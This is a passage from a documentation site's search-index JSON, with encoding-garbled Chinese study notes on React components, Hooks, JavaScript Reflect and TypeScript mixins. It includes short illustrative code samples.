=\u0026gt; void å¯¹æ›´æ–°åçš„ DOM è¿›è¡Œæ“ä½œ åœ¨æ›´æ–°åä¼šè¢«ç«‹å³è°ƒç”¨    å¸è½½é˜¶æ®µ #  æ‰§è¡Œä¸€ä¸ª componentWillUnmount æ–¹æ³•ã€‚\näº‹ä»¶å¤„ç† #  React äº‹ä»¶ä¸åŸç”Ÿ DOM äº‹ä»¶ï¼š\n React äº‹ä»¶å‘½åç»Ÿä¸€ä½¿ç”¨å°é©¼å³°å¼ï¼Œè€Œä¸æ˜¯çº¯å°å†™ï¼› React äº‹ä»¶åœ¨ jsx è¯­æ³•ä¸­éœ€è¦ä¼ å…¥ä¸€ä¸ª js çš„å‡½æ•°è€Œä¸æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼› React ä¸­çš„äº‹ä»¶æ—¶åˆæˆäº‹ä»¶ï¼Œå¹¶ä¸æ˜¯åŸç”Ÿçš„ DOM äº‹ä»¶ï¼Œå¦‚æœ‰éœ€è¦ï¼Œå¯ä»¥ä½¿ç”¨ e.nativeEvent è®¿é—®ï¼› è¦é˜»æ­¢äº‹ä»¶çš„é»˜è®¤è¡Œä¸ºï¼Œåœ¨ React ä¸­å¿…é¡»æ˜¾ç¤ºåœ°è°ƒç”¨ preventDefault æ–¹æ³•ï¼›  this çš„å¤„ç†ï¼šES6 å¹¶ä¸ä¼šå°†å‡½æ•°è‡ªåŠ¨ç»‘å®šåˆ°å½“å‰å®šä¹‰çš„å¯¹è±¡ä¸­ï¼Œå› æ­¤åœ¨ä½¿ç”¨éœ€è¦è°ƒç”¨ this çš„å‡½æ•°ä½œä¸ºäº‹ä»¶å¤„ç†å‡½æ•°æ—¶ï¼Œéœ€è¦å¯¹ this è¿›è¡Œç‰¹æ®Šçš„å¤„ç†ã€‚React ä¸­ä¸»è¦æœ‰ä»¥ä¸‹ä¸‰ç§å¤„ç†æ–¹å¼ï¼š\n ç®­å¤´å‡½æ•°ï¼Œæ¯”å¦‚ï¼š(e) =\u0026gt; this.handleEvent(e)ï¼› å‡½æ•°ç»‘å®šï¼Œåœ¨ constructor ä¸­å°†å‡½æ•°é€šè¿‡ bind å‡½æ•°ç»‘å®šåˆ°å½“å‰å¯¹è±¡ï¼Œæ¯”å¦‚ï¼šthis.handleEvent = this.handleEvent.bind(this)ï¼› class field è¿˜å¤„äºè‰æ¡ˆé˜¶æ®µï¼Œéœ€è¦å¼•å…¥ babel çš„æ’ä»¶ï¼Œæ¯”å¦‚ handleEvent = () =\u0026gt; {}ï¼›  åˆ—è¡¨ä¸è¡¨å• #  åˆ—è¡¨ #  React ä½¿ç”¨ key å±æ€§æ¥æ ‡è®°åˆ—è¡¨ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œå½“åˆ—è¡¨æ•°æ®å‘ç”Ÿå˜åŒ–æ—¶ï¼ŒReact å°±å¯ä»¥é€šè¿‡ key çŸ¥é“å“ªäº›å…ƒç´ å‘ç”Ÿäº†å˜åŒ–ï¼Œä»è€Œåªæ¸²æŸ“å‘ç”Ÿå˜åŒ–çš„å…ƒç´ ï¼Œæé«˜æ¸²æŸ“æ•ˆç‡ã€‚\nkey çš„åˆ¶å®šåŸåˆ™ï¼š\n key åº”è¯¥æ”¾åœ¨å°±è¿‘çš„æ•°ç»„ä¸Šä¸‹æ–‡ä¸­ï¼ŒæŒ‡å®šç»™æœ€ä¸Šå±‚çš„æ ‡ç­¾çš„å±æ€§ï¼› æ•°ç»„å…ƒç´ ä¸­ä½¿ç”¨ key åªåœ¨å…¶å…„å¼ŸèŠ‚ç‚¹ä¸­æ˜¯ç‹¬ä¸€æ— äºŒçš„ï¼› ä¸å»ºè®®ä½¿ç”¨ç´¢å¼•æ¥ä½œä¸º key å€¼ï¼Œå› ä¸ºè¿™æ ·ä¼šå¯¼è‡´æ€§èƒ½å˜å·®ï¼Œè¿˜å¯èƒ½å¼•èµ·ç»„ä»¶çŠ¶æ€é—®é¢˜ï¼›  å—æ§è¡¨å• #  ä¸€ä¸ªè¡¨å•çš„å€¼æ˜¯ç”± React æ¥è¿›è¡Œç®¡ç†çš„ï¼Œé‚£ä¹ˆå®ƒå°±æ˜¯ä¸€ä¸ªå—æ§ç»„ä»¶ã€‚\nå…·ä½“å®ç°ï¼š\nclass NameForm extends React.Component {  // ...  handleChange = event =\u0026gt; {  this.setState({ value: event.target.value });  }  // ...  render() {  return ( \u0026lt;input onChange={this.handleChange} /\u0026gt;\t/* äº¤ç”± NameForm å¤„ç† */ );  } } éå—æ§è¡¨å• #  å¦‚æœä¸€ä¸ªè¡¨å•çš„çŠ¶æ€ä»ç„¶ç”±è¡¨å•å…ƒç´ è‡ªå·±ç®¡ç†ï¼Œè€Œä¸æ˜¯äº¤ç»™ React.js ç»„ä»¶ç®¡ç†ï¼Œé‚£ä¹ˆä»–å°±æ˜¯ä¸€ä¸ªéå—æ§ç»„ä»¶ã€‚\nä¸‹é¢æ˜¯ä¸€ä¸ªéå—æ§ç»„ä»¶çš„ä¾‹å­ï¼š\nclass FlavorForm extends React.Component {  constructor (props) {  // ...  this.inputMangoRef = React.createRef();  }  handleSubmit = event =\u0026gt; {  event.preventDefault();  // ...  console.log(this.inputMangoRef.current.checked);  }  render () {  return (  \u0026lt;form onSubmit={this.handleSubmit}\u0026gt;  \u0026lt;input type=\u0026#34;checkbox\u0026#34; value=\u0026#34;mango\u0026#34; name=\u0026#34;mango\u0026#34; ref={this.inputMangoRef} /\u0026gt;  \u0026lt;/form\u0026gt;  )  } } refs #  Refs æ˜¯ React ä¸­è®¿é—® DOM èŠ‚ç‚¹ï¼Œè·å– render æ–¹æ³•ä¸­åˆ›å»ºçš„ React å…ƒç´ çš„ä¸€ç§æ–¹æ³•ã€‚\nRefs æœ‰ä»¥ä¸‹ä¸¤ç§ä½¿ç”¨æ–¹å¼ï¼š\n React.createRefï¼šä¸Šé¢â€œéå—æ§è¡¨å•â€çš„ä¾‹å­å°±æ˜¯ä½¿ç”¨çš„è¿™ç§æ–¹å¼è¿›è¡Œåˆ›å»ºçš„ï¼› å›è°ƒå‡½æ•°ï¼šç»™ ref å±æ€§å€¼è®¾ç½®ä¸ºä¸€ä¸ªå‡½æ•°ï¼Œå®ƒä¼šä»¥ ref ä¸ºå‚æ•°è°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼ˆæ³¨æ„ï¼šå¦‚æœæ˜¯ä»¥åŒ¿åå‡½æ•°çš„æ–¹å¼å®šä¹‰è¿™ä¸ªå‡½æ•°ï¼Œé‚£ä¹ˆæ¯æ¬¡æ›´æ–°æ—¶ä»–ä¼šè¢«æ‰§è¡Œä¸¤æ¬¡ï¼Œå…¶ä¸­ç¬¬ä¸€æ¬¡æ˜¯ nullï¼Œæ‰€ä»¥ä¸ºå‡ºäºæ€§èƒ½è€ƒè™‘ä¸å»ºè®®è¿™ä¹ˆå®šä¹‰ï¼‰  æ³¨æ„äº‹é¡¹ï¼š\n å‡½æ•°ç»„ä»¶ä¸èƒ½ä½¿ç”¨ refsï¼› åˆ‡å‹¿è¿‡åº¦ä½¿ç”¨ refsï¼›  "},{"id":89,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/reactjs/2.react%E8%BF%9B%E9%98%B6/","title":"2. Reactè¿›é˜¶","section":"reactjs","content":"React è¿›é˜¶ #  Context #  Context æ˜¯ React ä¸­æ¯”è¾ƒç‰¹æ®Šçš„å¯¹è±¡ï¼Œæ˜¯ä¸€ç§ç»„ä»¶ä¸­ä¼ å€¼çš„ç‰¹æ®Šæ–¹å¼ã€‚\nå› ä¸º React ä¸­çš„æ•°æ®æµå‘æ˜¯å•å‘çš„ï¼Œæ‰€ä»¥å¦‚æœéœ€è¦åœ¨å±‚çº§å¾ˆæ·±çš„ç»„ä»¶æ ‘ä¸­ä¼ å€¼çš„è¯ï¼Œéœ€è¦ä¸æ–­åœ°ä» props ä¸­å‘ä¸‹ä¼ å€¼ï¼ŒContext åˆ™è§£å†³äº†è¿™ä¸ªé—®é¢˜ï¼ˆä¸åŒå±‚çº§çš„ç»„ä»¶éœ€è¦è®¿é—®åŒæ ·ä¸€äº›æ•°æ®ï¼‰ã€‚\nReact ç›¸å…³ APIï¼š\n   API ä½œç”¨     React.createContext åˆ›å»ºä¸€ä¸ª Context å¯¹è±¡ï¼Œæ¥æ”¶ä¸€ä¸ªâ€œé»˜è®¤å€¼â€ä½œä¸ºå‚æ•°   Context.Provider ä¸€ä¸ª React ç»„ä»¶ï¼Œæ¥å—ä¸€ä¸ª value çš„å±æ€§å€¼ã€‚è¢«è¿™ä¸ªç»„ä»¶åŒ…è£¹çš„å­ç»„ä»¶éƒ½å¯ä»¥ä½¿ç”¨è¿™ä¸ªå±æ€§å€¼ã€‚   contextType å°†ä¸€ä¸ªç»„ä»¶çš„ static å±æ€§ contextType è®¾ç½®ä¸ºå¯¹åº”çš„ Context å¯¹è±¡ï¼Œå³å¯åœ¨è¿™ä¸ªç»„ä»¶å†…éƒ¨çš„ä»»æ„ç”Ÿå‘½å‘¨æœŸå‡½æ•°ä¸­ï¼Œé€šè¿‡ this.context è®¿é—®åˆ° Provider æä¾›çš„å±æ€§å€¼ã€‚   Context.Cosumer ä¸€ä¸ª React ç»„ä»¶ï¼Œæ¥å—ä¸€ä¸ªå‡½æ•°ä½œä¸ºå…¶åŒ…è£¹çš„å†…å®¹ï¼Œå‡½æ•°çš„å‚æ•°å³ä¸º Provider çš„ value å€¼ã€‚    æ³¨æ„äº‹é¡¹ï¼š\n context çš„é»˜è®¤å€¼ï¼Œåªæœ‰åœ¨ Cosumer çš„å¤–å±‚æ²¡æœ‰ Provider åŒ…è£¹çš„æ—¶å€™ä½¿ç”¨ï¼› Provider æ”¯æŒå¤šå±‚åµŒå¥—ï¼› æ¶ˆè´¹ç»„ä»¶çš„æ›´æ–°åªå–å†³äº Provider æ˜¯å¦æ›´æ–°ï¼Œä¸ä¼šæ‰§è¡Œ shouldComponentUpdateï¼›  é«˜é˜¶ç»„ä»¶ #  å®šä¹‰ï¼šé«˜é˜¶ç»„ä»¶ï¼ˆhigh order componentsï¼‰æ˜¯å‚æ•°ä¸ºç»„ä»¶ä¸”è¿”å›å€¼ä¹Ÿä¸ºç»„ä»¶çš„å‡½æ•°ã€‚\nç¼–å†™æ–¹å¼ #  æ ¹æ®é«˜é˜¶ç»„ä»¶å†…å®¹çš„ç¼–å†™æ–¹å¼å¯ä»¥åˆ†ä¸ºâ€œç»„åˆâ€å’Œâ€œåå‘ç»§æ‰¿â€ä¸¤ç§æ–¹å¼ã€‚\nç»„åˆï¼šå› ä¸ºè¿™ç§æ–¹å¼çš„ç¼–å†™ä¸­é€šå¸¸æ˜¯å¯¹å±æ€§çš„ä¸€äº›æ“ä½œï¼Œæ‰€ä»¥åˆè¢«ç§°ä¸ºâ€œå±æ€§ä»£ç†â€ï¼š\nconst hoc = data =\u0026gt; Wrapper =\u0026gt; {  return class HOC extends React.Component {  render() {  return \u0026lt;Wrapper {...this.props} {...ExtraPorps} /\u0026gt;  }  } } PS: è¿™é‡Œä½“ç°äº†å‡½æ•°å¼ç¼–ç¨‹çš„â€œæŸ¯é‡Œ curry åŒ–â€æ€æƒ³ï¼Œå³å°†æ¥å—å¤šä¸ªå‚æ•°çš„å‡½æ•°æ‹†åˆ†æˆæ¥å—å•ä¸ªå‚æ•°çš„å¤šä¸ªå‡½æ•°ã€‚\nåå‘ç»§æ‰¿ï¼šè¿”å›çš„æ–°ç»„ä»¶ç»§æ‰¿äºæ–°ç»„ä»¶ï¼š\nconst LOGHOC = Wrapper =\u0026gt; {  return class HOC extends Wrapper {  render() {  return super.render();  }  } } React é«˜é˜¶ç»„ä»¶çš„ç¼–å†™æ¯”è¾ƒæ¨èä½¿ç”¨â€œç»„åˆâ€çš„æ–¹å¼ï¼Œä»¥åç»§æ‰¿ä¼šå¯¹åŸæ¥ç»„ä»¶çš„ä¸€äº›å†…å®¹è¿›è¡Œä¿®æ”¹ã€‚\nä½¿ç”¨åœºæ™¯ #  åœºæ™¯ä¸€ï¼šæ“ä½œ propsã€‚\nexport const PropsHOC = Wrapper =\u0026gt; logContent =\u0026gt; {  return class HOC extends React.Component {  handleClick = () =\u0026gt; {  console.log(logContent);  this.props.onClick();  }  render() {  return \u0026lt;Wrapper onClick={this.handleClick} /\u0026gt;  }  } } åœºæ™¯äºŒï¼šé€šè¿‡ ref è®¿é—®ç»„ä»¶å®ä¾‹ï¼›\nåœºæ™¯ä¸‰ï¼šç»„ä»¶çŠ¶æ€æå‡ï¼›\nåœºæ™¯å››ï¼šç”¨å…¶ä»–å…ƒç´ åŒ…è£…ç»„ä»¶ã€‚\næ³¨æ„äº‹é¡¹ä¸è°ƒè¯•æŠ€å·§ #    ä¸è¦æ”¹å˜ç»„ä»¶åŸå‹ï¼š\n å³ä¸è¦é€šè¿‡ prototype ç­‰æ–¹å¼å½±å“ç»„ä»¶æœ¬èº«çš„ç‰¹æ€§ã€‚å»ºè®®é€šè¿‡ç»„åˆçš„æ–¹å¼æ–°å¢å‡½æ•°ã€‚    åº”è¯¥å°†ä¸ç›¸å…³çš„ propsï¼Œé€ä¼ ç»™è¢«åŒ…è£¹çš„ç»„ä»¶ã€‚\n  é€šè¿‡å°†å‡½æ•°æŸ¯é‡ŒåŒ–æœ€å¤§åŒ–é«˜é˜¶ç»„ä»¶çš„å¯ç»„åˆæ€§ã€‚\n  ç»™ç»„ä»¶è®¾ç½® displayName å±æ€§ï¼Œå¯ä»¥åœ¨ chrome è¿›è¡Œè°ƒè¯•æ—¶å±•ç¤ºå¯¹åº”ç»„ä»¶çš„åç§°ã€‚\n  ä¸è¦åœ¨ä»»ä½•ç”Ÿå‘½å‘¨æœŸæ–¹æ³•ä¸­ä½¿ç”¨ HOCã€‚\n  Fragment/Portal #  Fragment çš„ä½œç”¨ï¼Ÿ\n Fragment æ”¯æŒåœ¨ä»£ç ä¸­èšåˆå­å…ƒç´ çš„åˆ—è¡¨ï¼Œå¹¶ä¸ä¼šåœ¨ DOM ä¸­æ·»åŠ æ–°çš„èŠ‚ç‚¹ï¼ˆé€šå¸¸ç”¨ div å®ç°ï¼‰ã€‚  Portal çš„ä½œç”¨ï¼Ÿ\n Portal æ”¯æŒå®ç°åƒå¼¹çª—ç±»ä¼¼çš„åŠŸèƒ½ï¼› å®ƒåœ¨ DOM ä¸Šä¼šå°†å¯¹åº”çš„å…ƒç´ ä¼ é€åˆ°è§†å›¾æ ‘çš„æŒ‡å®šä½ç½®ï¼Œä½†æ˜¯å“åº”å†’æ³¡ä»ç„¶éµå¾ª React ä»£ç ä¸­çš„å®šä¹‰ã€‚  è°ƒå’Œæ€æƒ³ #  O(n) äº‹ä»¶å¤æ‚åº¦çš„ diff ç®—æ³•ã€‚ä¸ºäº†å®ç°åˆ—è¡¨çš„é‡å¤æ£€æµ‹ï¼Œç»™å®šäº† key å±æ€§ã€‚\n"},{"id":90,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/reactjs/hooks/","title":"Hooks","section":"reactjs","content":" å‚è€ƒæ–‡æ¡£ï¼š\n https://zh-hans.reactjs.org/docs/hooks-intro https://www.yuque.com/qianduanyongbuweinu/efahmp/vasyzy#8OGwa   Hooks #  ä¾‹å­ #  ä¸ Hooks ç›¸å…³çš„ API éƒ½æ˜¯ use å¼€å¤´çš„ï¼Œå®ƒè¿”å›ä¸€ä¸ªå…ƒç»„ã€‚ä»¥ useState ä¸ºä¾‹ï¼Œå®ƒè¿”å›ç¬¬ä¸€ä¸ªå…ƒç´ å³è¿™ä¸ªçŠ¶æ€ï¼Œç¬¬äºŒä¸ªå…ƒç´ æ˜¯è®¾ç½®è¿™ä¸ªçŠ¶æ€çš„å‡½æ•°ã€‚\nå…ˆçœ‹ä¸€ä¸ª useState ä½¿ç”¨çš„ä¾‹å­ï¼š\nexport const MyComponent: React.FC = () =\u0026gt; {  const [st, setSt] = useState\u0026lt;bool\u0026gt;(false);  return (  \u0026lt;div\u0026gt;  \u0026lt;button onClick={setSt} /\u0026gt;  \u0026lt;span\u0026gt;{st}\u0026lt;/span\u0026gt;  \u0026lt;/div\u0026gt;  ) } å¦ä¸€ä¸ªå¸¸è§çš„ Hooks å‡½æ•°å³ useEffectï¼Œç±»ä¼¼äº OOP ä¸­çš„ componentDidMount ä¸ componentDidUpdateï¼š\nexport const MyComponent: React.FC = () =\u0026gt; {  const [count, setCount] = useState(0);  useEffect(() =\u0026gt; {  document.title = `You clicked ${count}times`;  });  return (\u0026lt;div\u0026gt;\u0026lt;/div\u0026gt;) } ç®€ä»‹ #  ä½œä¸ºä¸€ç§æ”¹å˜ç»„ä»¶çŠ¶æ€ã€å¤„ç†ç»„ä»¶å‰¯ä½œç”¨çš„æ–¹å¼ï¼ŒHooks è¿™ä¸ªæ¦‚å¿µæœ€æ—©ç”±Reactæå‡ºï¼Œè€Œåè¢«æ¨å¹¿åˆ°å…¶ä»–æ¡†æ¶ï¼Œè¯¸å¦‚ Vueã€Svelteï¼Œç”šè‡³å‡ºç°äº†åŸç”ŸJSåº“ã€‚ä½†æ˜¯ï¼Œè¦ç†Ÿç»ƒä½¿ç”¨ Hook séœ€è¦å¯¹ JS é—­åŒ…æœ‰æ¯”è¾ƒå¥½çš„ç†è§£ã€‚\nä»€ä¹ˆæ˜¯ js é—­åŒ…ï¼Ÿ\n å½“ä»£ç å·²ç»æ‰§è¡Œåˆ°ä¸€ä¸ªå‡½æ•°è¯æ³•ä½œç”¨åŸŸä¹‹å¤–ï¼Œä½†æ˜¯è¿™ä¸ªå‡½æ•°ä»ç„¶å¯ä»¥è®°ä½å¹¶è®¿é—®ä»–çš„è¯æ³•ä½œç”¨åŸŸï¼Œé‚£ä¹ˆä»–å°±å½¢æˆäº†é—­åŒ…ã€‚  ä½¿ç”¨è§„åˆ™ #  åœ¨ React å®˜æ–¹æ–‡æ¡£ä¸­ï¼Œå¯¹ Hooks çš„ä½¿ç”¨åšå‡ºäº†ä»¥ä¸‹ä¸¤æ¡è§„åˆ™çš„é™åˆ¶ï¼š\n åªåœ¨æ§åˆ¶æµçš„æœ€é¡¶å±‚ä½¿ç”¨ Hooksï¼Œä¹Ÿå°±æ˜¯è¯´ä¸è¦åœ¨å¾ªç¯ã€æ¡ä»¶ã€åµŒå¥—å‡½æ•°ä¸­ä½¿ç”¨ Hooksï¼› åªåœ¨ React.FC ä¸­ä½¿ç”¨ Hooksï¼Œä¸è¦åœ¨æ™®é€šçš„ js å‡½æ•°ä¸­ä½¿ç”¨ Hooksï¼›  è¿™æ˜¯å› ä¸º React Hooks çš„åº•å±‚å®ç°æœºåˆ¶å¯¼è‡´çš„ï¼Œå¯ä»¥å›ç­”ä¸‹é¢é—®é¢˜å°±èƒ½ç†è§£è¿™ä¸¤æ¡é™åˆ¶ã€‚\nä¸€ä¸ªå‡½æ•°ç»„ä»¶ä¸­ä¼šä½¿ç”¨å¤šä¸ª stateï¼Œé‚£ä¹ˆ React æ€ä¹ˆçŸ¥é“å“ªä¸ª state å¯¹åº”å“ªä¸ª useStateï¼Ÿ\n effect ä¸ state åœ¨ React Hook çš„åº•å±‚æ˜¯ç”¨ä¸¤ä¸ªæ•°ç»„å®ç°çš„ï¼ŒReact æ˜¯é€šè¿‡è°ƒç”¨é¡ºåºç¡®å®šå®ƒä»¬çš„æ˜ å°„å…³ç³»çš„ã€‚  è‡ªå®šä¹‰ Hooks #  React Hooks æ˜¯ä¸€ä¸ªéå¸¸å¼ºå¤§çš„å·¥å…·ã€éå¸¸é€šç”¨çš„è®¾è®¡æ¨¡å¼ã€‚\nReact åŒæ ·æä¾›äº†è‡ªå®šä¹‰ Hooks çš„æ–¹å¼ï¼Œè‡ªå®šä¹‰ Hooks éƒ½ä»¥ use å¼€å¤´ï¼Œæœ‰éå¸¸ç¹è£çš„ç¬¬ä¸‰æ–¹ç”Ÿæ€ã€‚\n"},{"id":91,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/reflect/","title":"Reflect","section":"JavaScript","content":" https://es6.ruanyifeng.com/#docs/reflect\n Reflect #  æ¦‚è¿° #  Reflectå¯¹è±¡ä¸Proxyå¯¹è±¡ä¸€æ ·ï¼Œä¹Ÿæ˜¯ ES6 ä¸ºäº†æ“ä½œå¯¹è±¡è€Œæä¾›çš„æ–° APIã€‚Reflectå¯¹è±¡çš„è®¾è®¡ç›®çš„æœ‰è¿™æ ·å‡ ä¸ªï¼š\n å°† Object å¯¹è±¡çš„ä¸€äº›æ˜æ˜¾å±äºè¯­è¨€å†…éƒ¨çš„æ–¹æ³•ï¼ˆæ¯”å¦‚ Object.definePropertyï¼‰ï¼Œæ”¾åˆ° Reflect å¯¹è±¡ä¸Šã€‚ç°é˜¶æ®µï¼ŒæŸäº›æ–¹æ³•åŒæ—¶åœ¨ Object å’Œ Reflect å¯¹è±¡ä¸Šéƒ¨ç½²ï¼Œæœªæ¥çš„æ–°æ–¹æ³•å°†åªéƒ¨ç½²åœ¨ Reflect å¯¹è±¡ä¸Šã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä» Reflect å¯¹è±¡ä¸Šå¯ä»¥æ‹¿åˆ°è¯­è¨€å†…éƒ¨çš„æ–¹æ³•ã€‚ ä¿®æ”¹æŸäº› Object æ–¹æ³•çš„è¿”å›ç»“æœï¼Œè®©å…¶å˜å¾—æ›´åˆç†ã€‚æ¯”å¦‚ï¼ŒObject.defineProperty(obj, name, desc) åœ¨æ— æ³•å®šä¹‰å±æ€§æ—¶ï¼Œä¼šæŠ›å‡ºä¸€ä¸ªé”™è¯¯ï¼Œè€Œ Reflect.defineProperty(obj, name, desc) åˆ™ä¼šè¿”å› falseã€‚ è®© Object æ“ä½œéƒ½å˜æˆå‡½æ•°è¡Œä¸ºã€‚æŸäº› Object æ“ä½œæ˜¯å‘½ä»¤å¼ï¼Œæ¯”å¦‚ name in obj å’Œ delete obj[name]ï¼Œè€Œ Reflect.has(obj, name) å’Œ Reflect.deleteProperty(obj, name) è®©å®ƒä»¬å˜æˆäº†å‡½æ•°è¡Œä¸ºã€‚ Reflect å¯¹è±¡çš„æ–¹æ³•ä¸ Proxy å¯¹è±¡çš„æ–¹æ³•ä¸€ä¸€å¯¹åº”ï¼Œåªè¦æ˜¯ Proxy å¯¹è±¡çš„æ–¹æ³•ï¼Œå°±èƒ½åœ¨ Reflect å¯¹è±¡ä¸Šæ‰¾åˆ°å¯¹åº”çš„æ–¹æ³•ã€‚è¿™å°±è®© Proxy å¯¹è±¡å¯ä»¥æ–¹ä¾¿åœ°è°ƒç”¨å¯¹åº”çš„ Reflect æ–¹æ³•ï¼Œå®Œæˆé»˜è®¤è¡Œä¸ºï¼Œä½œä¸ºä¿®æ”¹è¡Œä¸ºçš„åŸºç¡€ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸ç®¡ Proxy æ€ä¹ˆä¿®æ”¹é»˜è®¤è¡Œä¸ºï¼Œä½ æ€»å¯ä»¥åœ¨ Reflect ä¸Šè·å–é»˜è®¤è¡Œä¸ºã€‚  MetaData #  API è¯¦è§ï¼šhttps://www.npmjs.com/package/reflect-metadata\nç”¨ Decorator å£°æ˜å¼è°ƒç”¨ï¼š\nclass C {  @Reflect.metadata(metadataKey, metadataValue)  method() {  } } ç›´æ¥å®šä¹‰å¼è°ƒç”¨ï¼š\nReflect.defineMetadata(metadataKey, metadataValue, C.prototype, \u0026#34;method\u0026#34;); é€šè¿‡ Reflect è·å–ä¹‹å‰å®šä¹‰çš„å€¼ï¼š\nlet obj = new C(); let metadataValue = Reflect.getMetadata(metadataKey, obj, \u0026#34;method\u0026#34;); "},{"id":92,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/typescript/stackoverflow/","title":"Stack Overflow","section":"typescript","content":"Stack Overflow #   æ¥è‡ª StackOverflow ä¸Šçš„å¤§ç¥æ•™ç¨‹ã€‚\n å¦‚ä½•å¾—åˆ°ä¸€ä¸ªç±»æ´¾ç”Ÿå‡ºçš„æ‰€æœ‰å­ç±»å‹ï¼šhttps://stackoverflow.com/questions/42414045/how-to-get-child-classes-which-implement-a-certain-base-class-using-reflection-i\nexport default function hierarchyTracked(target: new (...args: any[]) =\u0026gt; object) {  for (const proto of walkPrototypeChain(target)) {  if (!Object.hasOwnProperty.call(proto, \u0026#39;extendedBy\u0026#39;)) {  const extendedBy: typeof Function.extendedBy = [];  Object.defineProperty(proto, \u0026#39;extendedBy\u0026#39;, {  get: () =\u0026gt; extendedBy  });  }  // ! is used to suppress a strictNullChecks error on optional.  // This is OK since we know it is now defined.  proto.extendedBy!.push(target);  } }  declare global {  interface Function {  // Declared as optional because not all classes are extended.  extendedBy?: Array\u0026lt;new (...args: any[]) =\u0026gt; object\u0026gt;;  } }  function* walkPrototypeChain(target: new (...args: any[]) =\u0026gt; object) {  let proto = Reflect.getPrototypeOf(target);  while (proto \u0026amp;\u0026amp; proto !== Object) {  yield proto;  proto = Reflect.getPrototypeOf(proto);  } } "},{"id":93,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/typescript/trick/","title":"Trick","section":"typescript","content":"Trick #  å®šä¹‰ getter setterï¼Œåœ¨ç±»æ–¹æ³•å‰ä½¿ç”¨å…³é”®å­— get/setï¼›\n https://www.typescriptlang.org/docs/handbook/classes.html#accessors  ä½¿ç”¨ @ ç¬¦å·ï¼Œå¼•ç”¨ Decoratorï¼š\n https://www.typescriptlang.org/docs/handbook/decorators.html#property-decorators  ä½¿ç”¨æ¨¡ç‰ˆå­—ç¬¦ä¸²ï¼š\n https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals  "},{"id":94,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/typescript/%E5%85%B6%E4%BB%96/","title":"å…¶ä»–","section":"typescript","content":"Mixin #  Mixin æœ¬èº«æ˜¯ä¸€ç§è®¾è®¡æ¨¡å¼ï¼Œå®ƒæŒ‡ä¸é€šè¿‡ç»§æ‰¿è€Œæ˜¯é€šè¿‡æ··å…¥ï¼Œå°†ä¸€ä¸ªç±»çš„æ–¹æ³•æ·»åŠ åˆ°å¦ä¸€ä¸ªç±»ä¸­ã€‚è¿™é€šå¸¸ç”¨äºè§£å†³å¤šç»§æ‰¿çš„é—®é¢˜ï¼ˆä¸€ä¸ªå­ç±»ä¸èƒ½åŒæ—¶ç»§æ‰¿ä¸¤ä¸ªåŸºç±»ï¼‰ã€‚\nTypeScript å®˜æ–¹æ–‡æ¡£ç»™å‡ºäº†ä¸€ä¸ª mixin çš„æ–¹æ³•ï¼šhttps://www.typescriptlang.org/docs/handbook/mixins.htmlï¼š\n// Each mixin is a traditional ES class class Jumpable {  jump() {} }  class Duckable {  duck() {} }  // Including the base class Sprite {  x = 0;  y = 0; }  // Then you create an interface which merges // the expected mixins with the same name as your base interface Sprite extends Jumpable, Duckable {} // Apply the mixins into the base class via // the JS at runtime applyMixins(Sprite, [Jumpable, Duckable]);  let player = new Sprite(); player.jump(); console.log(player.x, player.y);  // This can live anywhere in your codebase: function applyMixins(derivedCtor: any, constructors: any[]) {  constructors.forEach((baseCtor) =\u0026gt; {  Object.getOwnPropertyNames(baseCtor.prototype).forEach((name) =\u0026gt; {  Object.defineProperty(  derivedCtor.prototype, name,  Object.getOwnPropertyDescriptor(baseCtor.prototype, name) ||  Object.create(null)  );  });  }); } "},{"id":95,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/typescript/%E8%8F%9C%E9%B8%9F%E6%95%99%E7%A8%8B/1.%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/","title":"1.åŸºæœ¬è¯­æ³•","section":"èœé¸Ÿæ•™ç¨‹","content":"å†…ç½®ç±»å‹ #  ç±»å‹æ˜¯ TypeScript ç›¸è¾ƒäº JavaScript å¢åŠ çš„ç‰¹æ€§ï¼Œä¹Ÿæ˜¯ TpyeScript çš„é‡ç‚¹å†…å®¹ã€‚\nå˜é‡å£°æ˜ #  å£°æ˜å˜é‡çš„ç±»å‹åŠåˆå§‹å€¼ï¼š\nvar [å˜é‡å] : [ç±»å‹] = å€¼; **æ³¨æ„ï¼š**å˜é‡ä¸è¦ä½¿ç”¨ name å¦åˆ™ä¼šä¸ DOM ä¸­çš„å…¨å±€ window å¯¹è±¡ä¸‹çš„ name å±æ€§å‡ºç°äº†é‡åã€‚\nç±»å‹æ–­è¨€ï¼ˆC++ ä¸­çš„å¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œä½†å¹¶ä¸å®Œå…¨æ˜¯ï¼‰ï¼š\n\u0026lt;ç±»å‹\u0026gt; å€¼ å€¼ as ç±»å‹   å½“ S ç±»å‹æ˜¯ T ç±»å‹çš„å­é›†ï¼Œæˆ–è€… T ç±»å‹æ˜¯ S ç±»å‹çš„å­é›†æ—¶ï¼ŒS èƒ½è¢«æˆåŠŸæ–­è¨€æˆ Tã€‚è¿™æ˜¯ä¸ºäº†åœ¨è¿›è¡Œç±»å‹æ–­è¨€æ—¶æä¾›é¢å¤–çš„å®‰å…¨æ€§ï¼Œå®Œå…¨æ¯«æ— æ ¹æ®çš„æ–­è¨€æ˜¯å±é™©çš„ï¼Œå¦‚æœä½ æƒ³è¿™ä¹ˆåšï¼Œä½ 